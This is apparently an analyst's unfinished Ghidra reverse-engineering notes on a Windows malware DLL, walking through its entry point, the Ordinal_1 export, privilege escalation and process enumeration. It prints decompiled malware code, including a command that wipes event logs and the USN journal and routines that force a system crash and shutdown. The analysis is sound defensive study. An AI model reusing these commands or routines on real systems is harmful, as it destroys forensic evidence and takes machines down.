# Analysis warning:

> PDB> Incomplete PDB information (GUID/Signature and/or age) associated with this program.
> Either the program is not a PE, or it was not compiled with debug information.
> Windows x86 PE RTTI Analyzer> Couldn't find type info structure.

This is probably fine since it seems illogical to include debug information with malware.

# Entry Point

No typical main function found. Instead going to entry point function.

`entry` seems to resemble the `DllMain` entry point but is missing the 3rd parameter:

```cpp
undefined4 entry(HMODULE param_1,int param_2){
  if (param_2 == 1) {
    DAT_1001f120 = param_1;
    DisableThreadLibraryCalls(param_1);
  }
  return 1;
}
```

MSDN lists the signature as:

```cpp
BOOL WINAPI DllMain(
  _In_ HINSTANCE hinstDLL,
  _In_ DWORD     fdwReason,
  _In_ LPVOID    lpvReserved
);
```

[MSDN DllMain](https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain)

Documentation for the 3rd argument seems to suggest that it can be `NULL` for dynamic loads however.
The body of the function checks for the second argument to be 1, from MSDN this is the constant for `DLL_PROCESS_ATTACH` meaning the DLL is being loaded. 
The first parameter is suggested to be a `HMODULE` and is a handle to the DLL module. By definition `HMODULE` and `HINSTANCE` represent the same data type on Windows versions that are more than 16-bits as can be found in the [Data Types MSDN documentation](https://docs.microsoft.com/en-us/windows/win32/winprog/windows-data-types).

Given that this is the entry point and we have no more information this being `DllMain` seems reasonable so we're going to input that into Ghidra.

Assuming that the provided `fdwReason` is `DLL_RPOCESS_ATTACH` then it becomes clear that we store a handle to the DLL module and invoke `DisableThreadLibraryCalls`. The latter from [MSDN DisableThreadLibraryCalls](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-disablethreadlibrarycalls) seems to just disable `DLL_THREAD_ATTACH` and `DLL_THREAD_DETACH` notifications though I have no idea what this means. We'll rename the DLL handle field however.

After this the entry point returns `1 (true)` for success.

# The second export

Given that this marks the end of the function we need something more. We know that were are loaded as a DLL. Moreover in Ghidra we can see that the entire DLL only exports two functions. One of them being the entry point we just looked at. A natural next point of investigation is the other exported function, labelled `Ordinal_1` by Ghidra.

# Ordinal_1

The `Ordinal_1` function contains a lot of logic and luckily also a fair few `WINAPI` calls which we should be able to use to deduce the type and purpose of some of the logic. Furthermore, at the end of the function is an infinite while loop that looks interesting. It seems highly likely that this function is the root function of the malware. The signature of the `Ordinal_1` function is as follows.

```cpp
void Ordinal_1(uint param_1,HANDLE param_2,LPCWSTR param_3,HANDLE param_4)
```

Using Ghidra we first check if there are references to this function. Save for external calls, such a call does exist. From a function called `FUN_100094a5` this function also seems to reference our earlier DLL handle and is probably used to load or reload the exported function. For now we'll just remember it.

In order to make it easier to reference stuff I'll also paste down below the raw decompilation result for the `Ordinal_1` function.

```cpp
void Ordinal_1(uint param_1,HANDLE param_2,LPCWSTR param_3,HANDLE param_4){
  uint uVar1;
  BOOL BVar2;
  DWORD dwFlags;
  HANDLE hHeap;
  int iVar3;
  HMODULE hModule;
  FARPROC pFVar4;
  HANDLE *ppvVar5;
  SIZE_T dwBytes;
  int *lpMem;
  WCHAR local_4a1c [8192];
  WCHAR local_a1c [1023];
  undefined2 local_21e;
  HANDLE local_21c [64];
  _OSVERSIONINFOW local_11c;

  int *local_8;
  
                    /* 0x7deb  1   */
  local_8 = (int *)0x10007df8;
  FUN_10007cc0();
  if (param_4 != (HANDLE)0xffffffff) {
    FUN_10009590(param_1,param_2,param_3);
  }
  Ordinal_115(0x202,&DAT_1001f768);
  DAT_1001f140 = FUN_10007091(0x24,(ULONG_PTR)FUN_10006eda,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xffff);
  DAT_1001f108 = FUN_10007091(8,(ULONG_PTR)FUN_10006c74,(PRTL_CRITICAL_SECTION_DEBUG)FUN_10006caa,
                              0xff);
  DAT_1001f110 = (LPCRITICAL_SECTION)0x0;
  InitializeCriticalSection((LPCRITICAL_SECTION)&DAT_1001f124);
  FUN_10006a2b(param_3);
  if ((DAT_1001f144 & 2) != 0) {
    FUN_1000835e();
    FUN_10008d5a();
  }
  FUN_100084df();
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10007c10,(LPVOID)0x0,0,(LPDWORD)0x0);
  if (((DAT_1001f144 & 2) != 0) && ((DAT_1001f104 & 1) != 0)) {
    FUN_10007545();
  }
  FUN_100070fa();
  if ((DAT_1001f104 & 2) != 0) {
    FUN_10008999(DAT_1001f144 & 6);
  }
  if ((DAT_1001f144 & 4) != 0) {
    DAT_1001f110 = FUN_10007091(4,(ULONG_PTR)FUN_10007ca5,(PRTL_CRITICAL_SECTION_DEBUG)0x0,0xff);
    uVar1 = FUN_1000875a((int)local_21c);
    if (uVar1 != 0) {
      ppvVar5 = local_21c;
      param_1 = uVar1;
      do {
        local_8 = (int *)*ppvVar5;
        param_3 = (LPCWSTR)0x0;
        param_2 = (HANDLE)0x0;
        param_3 = (LPCWSTR)CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10009f8e,(LPVOID)0x0,4,
                                        (LPDWORD)0x0);
        if (param_3 == (LPCWSTR)0x0) {
          param_2 = (HANDLE)0x57;
        }
        else {
          BVar2 = SetThreadToken(&param_3,local_8);
          if (BVar2 == 0) {
            param_2 = (HANDLE)GetLastError();
          }
          else {
            dwFlags = ResumeThread(param_3);
            if (dwFlags != 0xffffffff) goto LAB_10007f70;
          }
          CloseHandle(param_3);
        }
LAB_10007f70:
        SetLastError((DWORD)param_2);
        param_2 = *ppvVar5;
        param_3 = (LPCWSTR)0x0;
        param_4 = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_10007d58,&param_3,4,(LPDWORD)0x0);
        if (param_4 != (HANDLE)0x0) {
          BVar2 = SetThreadToken(&param_4,param_2);
          if (BVar2 != 0) {
            dwFlags = ResumeThread(param_4);
            if (dwFlags == 0xffffffff) {
              GetLastError();
            }
            else {
              WaitForSingleObject(param_4,0xffffffff);
            }
          }
          CloseHandle(param_4);
        }
        if (param_3 != (LPCWSTR)0x0) {
          FUN_10007298(DAT_1001f110,ppvVar5,0);
        }
        ppvVar5 = ppvVar5 + 1;
        param_1 = param_1 - 1;
      } while (param_1 != 0);
    }
  }
  FUN_100070fa();
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_1000a0fe,(LPVOID)0x0,0,(LPDWORD)0x0);
  param_4 = (HANDLE)0x0;
  param_1 = 0;
  param_3 = (LPCWSTR)0x0;
  param_2 = (HANDLE)0x0;
  FUN_10008282((uint *)&param_4,&param_1,(uint *)&param_3,(uint *)&param_2);
  dwBytes = 4;
  dwFlags = 8;
  hHeap = GetProcessHeap();
  local_8 = (int *)HeapAlloc(hHeap,dwFlags,dwBytes);
  if (local_8 != (int *)0x0) {
    *local_8 = (int)param_3 * 60000;
    hHeap = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_1000a274,local_8,0,(LPDWORD)0x0);
    if (hHeap == (HANDLE)0x0) {
      dwFlags = 0;
      lpMem = local_8;
      hHeap = GetProcessHeap();
      HeapFree(hHeap,dwFlags,lpMem);
    }
  }
  Sleep((int)param_4 * 60000);
  if ((DAT_1001f104 & 0x10) != 0) {
    FUN_10001eef();
  }
  Sleep((int)param_2 * 60000);
  if ((DAT_1001f144 & 2) != 0) goto LAB_1000811b;
  memset(&local_11c,0,0x114);
  local_11c.dwOSVersionInfoSize = 0x114;
  BVar2 = GetVersionExW((LPOSVERSIONINFOW)&local_11c);
  if (BVar2 == 0) goto LAB_1000811b;
  if ((local_11c.dwMajorVersion != 5) ||
     ((local_11c.dwMinorVersion != 1 && (local_11c.dwMinorVersion != 2)))) {
    if (local_11c.dwMajorVersion != 6) goto LAB_1000811b;
    if ((local_11c.dwMinorVersion != 0) && (local_11c.dwMinorVersion != 1)) goto LAB_1000811b;
  }
  FUN_10006bb0(local_4a1c);
  iVar3 = FUN_10007d6f(local_4a1c);
  if (iVar3 == 0) goto LAB_1000811b;
  do {
    ExitProcess(0);
LAB_1000811b:
    Sleep(param_1 * 60000);
    wsprintfW(local_a1c,
                            
              L"wevtutil cl Setup & wevtutil cl System & wevtutil cl Security & wevtutil clApplication & fsutil usn deletejournal /D %c:"
              ,(uint)DAT_1001f148);
    local_21e = 0;
    FUN_100083bd(3);
    if ((DAT_1001f144 & 1) != 0) {
      hModule = GetModuleHandleA("ntdll.dll");
      if ((hModule != (HMODULE)0x0) &&
         (pFVar4 = GetProcAddress(hModule,"NtRaiseHardError"), pFVar4 != (FARPROC)0x0)) {
        (*pFVar4)(0xc0000350,0,0,0,6,&param_3);
      }
      BVar2 = InitiateSystemShutdownExW((LPWSTR)0x0,(LPWSTR)0x0,0,1,1,0x80000000);
      if (BVar2 == 0) {
        ExitWindowsEx(6,0);
      }
    }
  } while( true );
}
```

We skip the variable declarations for now and instead look at `FUN_10007cc0`. 

```cpp
void FUN_10007cc0(void){
  BOOL BVar1;
  DWORD DVar2;
  uint uVar3;
  
  if (_DAT_1001f114 == 0) {
    DAT_1001f118 = GetTickCount();
    BVar1 = FUN_100081ba(L"SeShutdownPrivilege");
    uVar3 = (uint)(BVar1 != 0);
    BVar1 = FUN_100081ba(L"SeDebugPrivilege");
    if (BVar1 != 0) {
      uVar3 = uVar3 | 2;
    }
    BVar1 = FUN_100081ba(L"SeTcbPrivilege");
    if (BVar1 != 0) {
      uVar3 = uVar3 | 4;
    }
    DAT_1001f144 = uVar3;
    _DAT_1001f104 = FUN_10008677();
    DVar2 = GetModuleFileNameW(DLL_handle,&DAT_1001f148,0x30c);
    if (DVar2 != 0) {
      FUN_10008acf();
      return;
    }
  }
  return;
}
```

This function checks some datavalue `_DAT_1001f114` against being `0`. After that it calls `GetTickCount()` which from [MSDN](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount) turns out to return the number of millis since the system was started. Meaning we can rename the data variable that stores it.

Next we see 3 privilege related function calls. The result of which seems to be stored in some global variable. However, lets first look at the fun `FUN_100081ba` function before making assumptions.

```cpp
BOOL FUN_100081ba(LPCWSTR param_1){
  HANDLE ProcessHandle;
  BOOL BVar1;
  BOOL BVar2;
  DWORD DesiredAccess;
  HANDLE *TokenHandle;
  _TOKEN_PRIVILEGES local_1c;
  DWORD local_c;
  HANDLE local_8;
  
  local_1c.PrivilegeCount = 0;
  local_1c.Privileges[0].Luid.LowPart = 0;
  local_1c.Privileges[0].Luid.HighPart = 0;
  local_1c.Privileges[0].Attributes = 0;
  TokenHandle = &local_8;
  DesiredAccess = 0x28;
  BVar2 = 0;
  local_c = 0;
  local_8 = (HANDLE)0x0;
  ProcessHandle = GetCurrentProcess();
  BVar1 = OpenProcessToken(ProcessHandle,DesiredAccess,TokenHandle);
  if (BVar1 != 0) {
    BVar1 = LookupPrivilegeValueW((LPCWSTR)0x0,param_1,(PLUID)local_1c.Privileges);
    if (BVar1 != 0) {
      local_1c.PrivilegeCount = 1;
      local_1c.Privileges[0].Attributes = 2;
      BVar2 = AdjustTokenPrivileges
                        (local_8,0,(PTOKEN_PRIVILEGES)&local_1c,0,(PTOKEN_PRIVILEGES)0x0,(PDWORD)0x0
                        );
      local_c = GetLastError();
      if (local_c != 0) {
        BVar2 = 0;
      }
    }
  }
  SetLastError(local_c);
  return BVar2;
}
```

The first thing to note is that this function does not call any other non standard functions. 
Secondly we see this function calling [OpenProcessToken](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken) in order to optain the access token for the current process. The access we try to obtain the token with is `0x28` from [the source](https://referencesource.microsoft.com/#System.Workflow.Runtime/DebugEngine/NativeMethods.cs,60ee4c1b376d5f3f,references) we find that this is the combination of `0x20` and `0x08` denoting `TOKEN_QUERY` and `TOKEN_ADJUST_PRIVILEGES`.

Next we see a privilege look up for the `LPCWSTR` that was passed as the function argument. This means we can rename `param_1` to something more descriptive. From the [MSDN documentation for LoopupPrivilegeValueW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew) we find that this gets the `LUID` by which the privilege is known on the system.

If this succeeds then it tries to adjust the token privileges. By setting the attributes of the passed in privilege name to `2`. From [some more research](https://github.com/microsoft/Windows-classic-samples/blob/master/Samples/Win7Samples/winbase/bootconfigurationdata/bcdsamplelib/Utils.cs) we find that this constant maps to `SE_PRIVILEGE_ENABLED`. Meaning this function enables a privilege.

If this operation succeeds the function returns `1 (true)` and otherwise `0 (false)`. This means we can change the function name to something like `grant_privilege`.

Going back to `FUN_10007cc0` we then see that we try to grant the process the `SeShutdownPrivilege`, `SeDebugPrivilege` and `SeTcbPrivilege`. The bitwise combination is then stored in the `DAT_1001f144` global with the priviledes having the values `1`, `2` and `4` (same order as before). This also means we can rename the global.

Next follows yet another function call `FUN_10008677`.

```cpp
uint FUN_10008677(void)

{
  byte *pbVar1;
  short sVar2;
  int iVar3;
  short *psVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  undefined4 local_23c [9];
  short local_218;
  undefined local_216 [518];
  HANDLE local_10;
  int local_c;
  uint local_8;
  
  local_8 = 0xffffffff;
  local_10 = (HANDLE)CreateToolhelp32Snapshot(2,0);
  if (local_10 != (HANDLE)0xffffffff) {
    local_23c[0] = 0x22c;
    iVar3 = Process32FirstW(local_10,local_23c);
    while (iVar3 != 0) {
      psVar4 = &local_218;
      local_c = 0x12345678;
      uVar7 = 0;
      do {
        sVar2 = *psVar4;
        psVar4 = psVar4 + 1;
      } while (sVar2 != 0);
      uVar5 = (int)((int)psVar4 - (int)local_216) >> 1;
      do {
        uVar6 = 0;
        uVar8 = uVar7;
        if (uVar5 != 0) {
          do {
            pbVar1 = (byte *)((int)&local_c + (uVar8 & 3));
            psVar4 = &local_218 + uVar6;
            uVar6 = uVar6 + 1;
            *pbVar1 = (*(byte *)psVar4 ^ *pbVar1) - 1;
            uVar8 = uVar8 + 1;
          } while (uVar6 < uVar5);
        }
        uVar7 = uVar7 + 1;
      } while (uVar7 < 3);
      if (local_c == 0x2e214b44) {
        local_8 = local_8 & 0xfffffff7;
      }
      else {
        if ((local_c == 0x6403527e) || (local_c == 0x651b3005)) {
          local_8 = local_8 & 0xfffffffb;
        }
      }
      iVar3 = Process32NextW(local_10,local_23c);
    }
    CloseHandle(local_10);
  }
  return local_8;
}
```

First we notice again that there are no non standard calls in this section. The function however looks fairly complicated. The first thing we see is that the process creates a snapshot by invoking [CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) with the `dwFlags` set to `2` and the `th32ProcessID` set to `0`. Presumably these refer to constants. For the `dwFlags` we find that `2` refers to `TH32CS_SNAPPROCESS` which refers to all processes in the system. The value of `0` for `th32ProcessID` turns out to be shorthand for the current process. Effectively this means that a snapshot is made of the entire malware.

If the snapshot is made succesfully a handle to the made snapshot is returned. If this failed the value `-1 (0xffffffff)` is returned from the entire function.

Next we see a call to [Process32FirstW](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32firstw). The first passed argument is the newly created snapshot handle. The second argument is a `LPPROCESSENTRY32W` structure. [The documentation](https://docs.microsoft.com/nl-nl/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32) for this struture requires the dwSize argument to be set to `sizeof(PROCESSENTRY32)` before use. It seems like Ghidra was not quite able to figure this out and turned it into `local_23c[0] = 0x22c;` instead, for some reason Ghidra failed to parse the `tlhelp32.h` header when I tried to add this. Most likely there is a fix for this, but the it's not too important for now so lets no waste too much time adding this type and instead to rename the local with some useful name.




























One of the first things to note in the function is that it checks the 4th argument against `0xffffffff`. We also know that it is cast to a `HANDLE`. Further more we know that depending on the compiler a `HANDLE` is 32 or 64 bits and Ghidra tells us as general information that the application is using 32 bits Address Size. Meaning it is a `DWORD` and corresponds to `-1`. Some more MSDN searching reveals that this is the constant for `INVALID_HANDLE_VALUE`.






memory:
- `FUN_100094a5` - only internal reference to `Ordinal_1`






















